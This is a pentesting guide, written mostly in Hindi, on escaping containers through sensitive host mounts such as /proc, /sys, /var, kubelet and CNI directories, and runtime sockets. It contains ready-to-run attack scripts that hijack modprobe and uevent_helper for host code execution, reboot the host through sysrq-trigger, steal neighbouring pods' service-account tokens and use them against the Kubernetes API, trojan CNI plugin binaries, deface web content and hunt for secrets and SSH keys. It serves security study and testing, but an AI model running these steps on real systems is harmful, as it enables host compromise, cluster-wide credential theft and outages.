# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

Host mounts सबसे महत्वपूर्ण practical container-escape surfaces में से एक हैं, क्योंकि वे अक्सर carefully isolated process view को सीधे host resources की visibility में बदल देते हैं। खतरनाक मामले केवल `/` तक सीमित नहीं हैं। `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state या device-related paths के bind mounts kernel controls, credentials, neighboring container filesystems और runtime management interfaces को expose कर सकते हैं।

यह page individual protection pages से अलग मौजूद है, क्योंकि abuse model cross-cutting है। Writable host mount आंशिक रूप से mount namespaces, आंशिक रूप से user namespaces, आंशिक रूप से AppArmor या SELinux coverage और आंशिक रूप से expose किए गए exact host path के कारण खतरनाक होता है। इसे अपने स्वतंत्र topic के रूप में देखने से attack surface को समझना बहुत आसान हो जाता है।

## `/proc` Exposure

procfs में ordinary process information और high-impact kernel control interfaces दोनों होते हैं। इसलिए `-v /proc:/host/proc` जैसा bind mount या unexpected writable proc entries को expose करने वाला container view information disclosure, denial of service या direct host code execution तक ले जा सकता है।

High-value procfs paths में शामिल हैं:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### दुरुपयोग

सबसे पहले जाँचें कि कौन-सी high-value procfs entries visible या writable हैं:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
ये paths अलग-अलग कारणों से interesting हैं। `core_pattern`, `modprobe`, और `binfmt_misc` writable होने पर host code-execution paths बन सकते हैं। `kallsyms`, `kmsg`, `kcore`, और `config.gz` kernel exploitation के लिए powerful reconnaissance sources हैं। `sched_debug` और `mountinfo` process, cgroup, और filesystem context reveal करते हैं, जिससे container के अंदर से host layout reconstruct करने में मदद मिल सकती है।

हर path की practical value अलग होती है, और उन सभी को एक जैसा impact वाला मानने से triage कठिन हो जाता है:

- `/proc/sys/kernel/core_pattern`
अगर writable हो, तो यह सबसे high-impact procfs paths में से एक है, क्योंकि crash के बाद kernel एक pipe handler execute करेगा। ऐसा container जो `core_pattern` को अपने overlay या किसी mounted host path में stored payload की ओर point कर सके, अक्सर host code execution प्राप्त कर सकता है। एक dedicated example के लिए [read-only-paths.md](protections/read-only-paths.md) भी देखें।
- `/proc/sys/kernel/modprobe`
यह path उस userspace helper को control करता है जिसका उपयोग kernel module-loading logic invoke करने के लिए करता है। अगर container से writable हो और host context में interpret किया जाए, तो यह एक और host code-execution primitive बन सकता है। यह तब खास तौर पर interesting होता है जब helper path को trigger करने का कोई तरीका भी मौजूद हो।
- `/proc/sys/vm/panic_on_oom`
यह आम तौर पर clean escape primitive नहीं है, लेकिन OOM conditions को kernel panic behavior में बदलकर memory pressure को host-wide denial of service में बदल सकता है।
- `/proc/sys/fs/binfmt_misc`
अगर registration interface writable हो, तो attacker चुने गए magic value के लिए handler register कर सकता है और matching file execute होने पर host-context execution प्राप्त कर सकता है।
- `/proc/config.gz`
Kernel exploit triage के लिए useful है। यह host package metadata की आवश्यकता के बिना यह निर्धारित करने में मदद करता है कि कौन से subsystems, mitigations, और optional kernel features enabled हैं।
- `/proc/sysrq-trigger`
मुख्यतः denial-of-service path है, लेकिन बहुत serious है। यह तुरंत host को reboot, panic या अन्य तरीकों से disrupt कर सकता है।
- `/proc/kmsg`
Kernel ring buffer messages reveal करता है। यह host fingerprinting और crash analysis के लिए useful है, और कुछ environments में kernel exploitation के लिए helpful information leak करने के लिए भी उपयोगी हो सकता है।
- `/proc/kallsyms`
Readable होने पर valuable है, क्योंकि यह exported kernel symbol information expose करता है और kernel exploit development के दौरान address randomization assumptions को defeat करने में मदद कर सकता है।
- `/proc/[pid]/mem`
यह direct process-memory interface है। अगर target process आवश्यक ptrace-style conditions के साथ reachable हो, तो यह किसी अन्य process की memory पढ़ने या modify करने की अनुमति दे सकता है। वास्तविक impact credentials, `hidepid`, Yama, और ptrace restrictions पर बहुत अधिक निर्भर करता है, इसलिए यह powerful लेकिन conditional path है।
- `/proc/kcore`
यह system memory का core-image-style view expose करता है। File बहुत बड़ी और उपयोग करने में awkward होती है, लेकिन अगर यह meaningfully readable हो, तो यह badly exposed host memory surface का संकेत है।
- `/proc/kmem` और `/proc/mem`
Historically high-impact raw memory interfaces हैं। कई modern systems पर ये disabled या heavily restricted होते हैं, लेकिन अगर मौजूद और usable हों, तो इन्हें critical findings माना जाना चाहिए।
- `/proc/sched_debug`
Scheduling और task information leak करता है, जिससे host process identities expose हो सकती हैं, भले ही अन्य process views अपेक्षा से अधिक clean दिखाई दें।
- `/proc/[pid]/mountinfo`
यह reconstruct करने के लिए extremely useful है कि container वास्तव में host पर कहाँ स्थित है, कौन से paths overlay-backed हैं, और कोई writable mount host content से संबंधित है या केवल container layer से।

अगर `/proc/[pid]/mountinfo` या overlay details readable हों, तो उनका उपयोग container filesystem का host path recover करने के लिए करें:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
ये commands उपयोगी हैं क्योंकि कई host-execution tricks के लिए container के अंदर मौजूद path को host के दृष्टिकोण से संबंधित path में बदलना आवश्यक होता है।

### Full Example: `modprobe` Helper Path Abuse

यदि `/proc/sys/kernel/modprobe` container से writable है और helper path को host context में interpret किया जाता है, तो इसे attacker-controlled payload की ओर redirect किया जा सकता है:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
सटीक trigger target और kernel behavior पर निर्भर करता है, लेकिन महत्वपूर्ण बात यह है कि writable helper path भविष्य में होने वाले kernel helper invocation को attacker-controlled host-path content की ओर redirect कर सकता है।

### `kallsyms`, `kmsg` और `config.gz` के साथ पूर्ण उदाहरण: Kernel Recon

यदि लक्ष्य तत्काल escape के बजाय exploitability assessment है:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
ये commands यह पता लगाने में मदद करते हैं कि उपयोगी symbol information दिखाई दे रही है या नहीं, हाल के kernel messages से कोई रोचक state सामने आती है या नहीं, और कौन-से kernel features या mitigations compile किए गए हैं। इसका प्रभाव आमतौर पर direct escape नहीं होता, लेकिन यह kernel-vulnerability triage को काफी तेज कर सकता है।

### Full Example: SysRq Host Reboot

यदि `/proc/sysrq-trigger` writable है और host view तक पहुंचता है:
```bash
echo b > /proc/sysrq-trigger
```
प्रभाव तुरंत host reboot होता है। यह कोई subtle example नहीं है, लेकिन यह स्पष्ट रूप से दिखाता है कि procfs exposure information disclosure से कहीं अधिक गंभीर हो सकता है।

## `/sys` Exposure

sysfs बड़ी मात्रा में kernel और device state expose करता है। कुछ sysfs paths मुख्य रूप से fingerprinting के लिए उपयोगी होते हैं, जबकि अन्य helper execution, device behavior, security-module configuration या firmware state को प्रभावित कर सकते हैं।

High-value sysfs paths में शामिल हैं:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

ये paths अलग-अलग कारणों से महत्वपूर्ण हैं। `/sys/class/thermal` thermal-management behavior को प्रभावित कर सकता है और इसलिए गलत तरीके से exposed environments में host stability को प्रभावित कर सकता है। `/sys/kernel/vmcoreinfo` crash-dump और kernel-layout information leak कर सकता है, जिससे low-level host fingerprinting में मदद मिलती है। `/sys/kernel/security` Linux Security Modules द्वारा उपयोग किया जाने वाला `securityfs` interface है, इसलिए वहां unexpected access MAC-related state को expose या alter कर सकता है। EFI variable paths firmware-backed boot settings को प्रभावित कर सकते हैं, जिससे वे ordinary configuration files की तुलना में कहीं अधिक गंभीर बन जाते हैं। `/sys/kernel/debug` के अंतर्गत `debugfs` विशेष रूप से खतरनाक है, क्योंकि यह जानबूझकर developer-oriented interface है और hardened production-facing kernel APIs की तुलना में इसमें safety expectations बहुत कम होती हैं।

इन paths के लिए उपयोगी review commands हैं:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
वे commands क्यों interesting हैं:

- `/sys/kernel/security` से यह पता चल सकता है कि AppArmor, SELinux या कोई अन्य LSM surface ऐसे तरीके से visible है, जिसे केवल host तक सीमित रहना चाहिए था।
- `/sys/kernel/debug` अक्सर इस group में सबसे alarming finding होता है। यदि `debugfs` mounted और readable या writable है, तो kernel-facing एक व्यापक surface की अपेक्षा करें, जिसका exact risk enabled debug nodes पर निर्भर करता है।
- EFI variable exposure कम common है, लेकिन high impact हो सकता है, क्योंकि यह सामान्य runtime files के बजाय firmware-backed settings को प्रभावित करता है।
- `/sys/class/thermal` मुख्य रूप से host stability और hardware interaction के लिए relevant है, न कि किसी साफ-सुथरे shell-style escape के लिए।
- `/sys/kernel/vmcoreinfo` मुख्य रूप से host-fingerprinting और crash-analysis source है, जो low-level kernel state को समझने में उपयोगी होता है।

### Full Example: `uevent_helper`

यदि `/sys/kernel/uevent_helper` writable है, तो `uevent` trigger होने पर kernel attacker-controlled helper को execute कर सकता है:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
इसका काम करने का कारण यह है कि helper path को host के दृष्टिकोण से interpret किया जाता है। Trigger होने के बाद helper current container के अंदर चलने के बजाय host context में चलता है।

## `/var` Exposure

Host के `/var` को container में mount करना अक्सर कम गंभीर समझा जाता है, क्योंकि यह `/` को mount करने जितना नाटकीय नहीं दिखता। व्यवहार में, यह runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens और आसपास के application filesystems तक पहुँचने के लिए पर्याप्त हो सकता है। आधुनिक nodes पर, `/var` अक्सर वह स्थान होता है जहाँ सबसे अधिक operational रूप से महत्वपूर्ण container state वास्तव में रहती है।

### Kubernetes उदाहरण

`hostPath: /var` वाला pod अक्सर अन्य pods के projected tokens और overlay snapshot content पढ़ सकता है:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
ये commands इसलिए उपयोगी हैं क्योंकि वे यह निर्धारित करने में सहायता करते हैं कि mount केवल सामान्य application data expose करता है या high-impact cluster credentials भी। Readable service-account token local code execution को तुरंत Kubernetes API access में बदल सकता है।

यदि token मौजूद है, तो केवल token discovery पर रुकने के बजाय यह validate करें कि वह किन resources तक पहुँच सकता है:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
यहाँ impact केवल local node access से कहीं अधिक बड़ा हो सकता है। Broad RBAC वाला token, mounted `/var` को पूरे cluster के compromise में बदल सकता है।

### Docker और containerd Example

Docker hosts पर संबंधित data अक्सर `/var/lib/docker` के अंतर्गत होता है, जबकि containerd-backed Kubernetes nodes पर यह `/var/lib/containerd` या snapshotter-specific paths के अंतर्गत हो सकता है:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
यदि mounted `/var` किसी अन्य workload के writable snapshot contents को expose करता है, तो attacker application files को बदलने, web content plant करने या वर्तमान container configuration को छुए बिना startup scripts बदलने में सक्षम हो सकता है।

Writable snapshot content मिलने पर concrete abuse ideas:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
ये commands उपयोगी हैं क्योंकि ये mounted `/var` से जुड़े impact के तीन मुख्य families दिखाते हैं: application tampering, secret recovery और neighboring workloads में lateral movement।

## Kubelet State, Plugins और CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin` या `/etc/cni/net.d` का mount अक्सर privileged DaemonSets, CNI agents, CSI node plugins, GPU operators और storage helpers के माध्यम से exposed होता है। इन mounts को "node plumbing" कहकर आसानी से नज़रअंदाज़ किया जा सकता है, लेकिन ये नए pods के execution path में सीधे स्थित होते हैं और इनमें अक्सर kubelet credentials, projected secrets, registration sockets और executable host-side plugin binaries होते हैं।

High-value targets में शामिल हैं:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

उपयोगी review commands हैं:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
इन paths का महत्व:

- `/var/lib/kubelet/pki` से kubelet client certificates और अन्य node-local credentials उजागर हो सकते हैं, जिन्हें cluster design के आधार पर कभी-कभी API server या kubelet-facing TLS endpoints के विरुद्ध reuse किया जा सकता है।
- `/var/lib/kubelet/pods` में अक्सर उसी node पर मौजूद neighboring pods के लिए projected service-account tokens और mounted Secrets होते हैं।
- `/var/lib/kubelet/pod-resources/kubelet.sock` मुख्यतः एक reconnaissance surface है, लेकिन यह बहुत उपयोगी है: इससे पता चलता है कि वर्तमान में कौन-से pods और containers GPUs, hugepages, SR-IOV devices और अन्य scarce node-local resources का उपयोग कर रहे हैं।
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` और `/var/lib/kubelet/plugins_registry` से पता चलता है कि कौन-से CSI, DRA और device plugins installed हैं और kubelet को किन sockets से बात करने की अपेक्षा है। यदि ये directories केवल readable होने के बजाय writable हैं, तो finding बहुत अधिक गंभीर हो जाती है।
- `/opt/cni/bin` और `/etc/cni/net.d` pod-network setup path पर सीधे स्थित हैं। वहाँ writable access अक्सर केवल configuration exposure के बजाय delayed host-execution primitive होता है।

### Full Example: Writable `/opt/cni/bin`

यदि host CNI binary directory read-write रूप में mounted है, तो किसी plugin को replace करना ही host execution प्राप्त करने के लिए पर्याप्त हो सकता है, अगली बार जब kubelet उस node पर pod sandbox बनाए:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
यह mounted `docker.sock` जितना तत्काल नहीं है, लेकिन compromised Kubernetes infrastructure pods में यह अक्सर अधिक realistic होता है। महत्वपूर्ण बात यह है कि modified binary को बाद में host network setup flow द्वारा execute किया जाता है, current container द्वारा नहीं।


## Runtime Sockets

Sensitive host mounts में अक्सर full directories के बजाय runtime sockets शामिल होते हैं। ये इतने महत्वपूर्ण हैं कि यहाँ इन्हें स्पष्ट रूप से दोहराना आवश्यक है:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
इनमें से किसी socket के mount हो जाने के बाद पूरे exploitation flows के लिए [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) देखें।

एक त्वरित first interaction pattern के रूप में:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
यदि इनमें से कोई एक सफल हो जाता है, तो "mounted socket" से "start a more privileged sibling container" तक का रास्ता आमतौर पर किसी भी kernel breakout path की तुलना में बहुत छोटा होता है।

## Writable Host Path Task Hijack

खतरनाक होने के लिए writable host mount का `/` को expose करना आवश्यक नहीं है। यदि mounted path में scripts, config files, hooks, plugins या ऐसी files हैं जिन्हें बाद में host-side scheduled task या service consume करती है, तो container host द्वारा execute की जाने वाली चीज़ों को बदलने में सक्षम हो सकता है।

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
यदि किसी writable file को host process consume करता है, तो testing के दौरान payload को simple और observable रखें:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
दिलचस्प हिस्सा trust boundary है: write container के अंदर से होता है, लेकिन execution बाद में host service context में होता है। इससे एक संकीर्ण hostPath या bind mount delayed host-code-execution primitive में बदल जाता है।

## Mount-Related CVEs

Host mounts runtime vulnerabilities से भी जुड़े होते हैं। हाल के महत्वपूर्ण उदाहरणों में शामिल हैं:

- `runc` में `CVE-2024-21626`, जिसमें leaked directory file descriptor working directory को host filesystem पर रख सकता था।
- BuildKit में `CVE-2024-23651`, `CVE-2024-23652`, और `CVE-2024-23653`, जिनमें malicious Dockerfiles, frontends, और `RUN --mount` flows builds के दौरान host file access, deletion, या elevated privileges को फिर से सक्षम कर सकते थे।
- Buildah और Podman build flows में `CVE-2024-1753`, जिसमें crafted bind mounts build के दौरान `/` को read-write रूप में expose कर सकते थे।
- `containerd` 2.1.0 में `CVE-2025-47290`, जिसमें image unpack के दौरान TOCTOU विशेष रूप से crafted image को pull के समय host filesystem में बदलाव करने की अनुमति दे सकता था।

ये CVEs यहां महत्वपूर्ण हैं क्योंकि वे दिखाते हैं कि mount handling केवल operator configuration पर निर्भर नहीं है। Runtime स्वयं भी mount-driven escape conditions उत्पन्न कर सकता है।

## Checks

सबसे अधिक महत्वपूर्ण mount exposures को जल्दी locate करने के लिए इन commands का उपयोग करें:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
यहाँ क्या interesting है:

- Host root, `/proc`, `/sys`, `/var`, और runtime sockets सभी high-priority findings हैं।
- Writable proc/sys entries का अक्सर अर्थ होता है कि mount सुरक्षित container view के बजाय host-global kernel controls को expose कर रहा है।
- Mounted `/var` paths की credential और neighboring-workload review होनी चाहिए, केवल filesystem review नहीं।
- Kubelet state directories और CNI/plugin paths को runtime sockets के समान priority देनी चाहिए, क्योंकि वे अक्सर node के pod-creation और credential-distribution path पर सीधे स्थित होते हैं।

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
